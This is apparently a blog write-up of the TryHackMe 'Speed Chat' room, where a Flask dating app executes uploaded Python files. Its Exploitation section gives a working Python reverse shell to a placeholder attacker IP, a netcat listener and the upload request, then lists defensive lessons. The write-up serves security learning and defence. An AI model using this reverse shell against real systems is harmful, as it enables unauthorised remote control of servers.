---
title: "TryHackMe - Speed Chat"
date: 2026-02-15
tags: ["tryhackme", "easy", "file-upload", "rce", "python", "flask", "web"]
difficulty: "easy"
platform: "TryHackMe"
time_taken: "30 minutes"
draft: false
---

## Overview

Speed Chat is a Valentine's Day themed easy-difficulty room featuring "LoveConnect", a Flask-based speed dating chat application that was rushed to production without proper security testing. The vulnerability is a classic unrestricted file upload — the profile picture upload endpoint accepts any file type including Python scripts, which the server executes immediately on upload, giving unauthenticated remote code execution.

---

## Reconnaissance

The target runs a Flask web application on port 5000. There is no login or registration — visiting the app gives you an instant session as the demo user.

```bash
nmap -sC -sV 10.66.141.27
```

| Port | Service | Details |
|---|---|---|
| 22/tcp | SSH | OpenSSH |
| 5000/tcp | HTTP | Werkzeug/3.1.5 Python/3.10.12 |

The app has two features — a profile section with a photo upload form, and a speed chat room. Directory enumeration returns nothing useful. There are no admin panels, debug endpoints, or additional routes.

---

## Identifying the Vulnerability

The profile section allows uploading a profile picture via `POST /upload_profile_pic`. Intercepting the request in Burp Suite reveals no meaningful validation — the server accepts any file regardless of extension or content type.

Uploaded files are stored at `/uploads/profile_<uuid>.<original_extension>` and served statically. Crucially, when a `.py` file is uploaded, the server **executes it immediately** rather than simply storing it. This is the critical vulnerability — the application passes uploaded files directly to the Python interpreter.

---

## Exploitation

Set up a netcat listener:

```bash
nc -lvnp 4444
```

Create a Python reverse shell payload:

```python
import socket
import os
import pty

s = socket.socket()
s.connect(("<ATTACKER_IP>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
```

Upload it as the profile picture via Burp Suite, keeping the `.py` extension:

```
POST /upload_profile_pic HTTP/1.1
Host: 10.66.141.27:5000
Content-Type: multipart/form-data; boundary=...

Content-Disposition: form-data; name="profile_pic"; filename="shell.py"
Content-Type: text/x-python

[payload contents]
```

The server executes the file on upload and a shell connects back immediately:

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received!
$ cat flag.txt
THM{REDACTED}
```

---

## Key Takeaways

- **Validate file uploads server-side, strictly.** The server should check both the file extension and the actual file contents (magic bytes) against an allowlist of permitted image types. Accepting `.py`, `.php`, `.sh` or any executable format on an image upload endpoint is critical.
- **Never execute uploaded files.** Whatever mechanism caused the server to execute the uploaded Python script — whether a misconfigured import, a subprocess call, or a development testing artifact left in production — uploaded user content should never be passed to an interpreter under any circumstances.
- **"Rushed to production" is a real threat.** The room brief explicitly states security was skipped to meet a deadline. This is a common real-world scenario — time pressure leads to shortcuts that leave critical vulnerabilities in place.
- **The AttackBox avoids VPN routing issues.** When reverse shells are dropping on a local Kali setup, switching to the TryHackMe AttackBox eliminates VPN reliability as a variable.
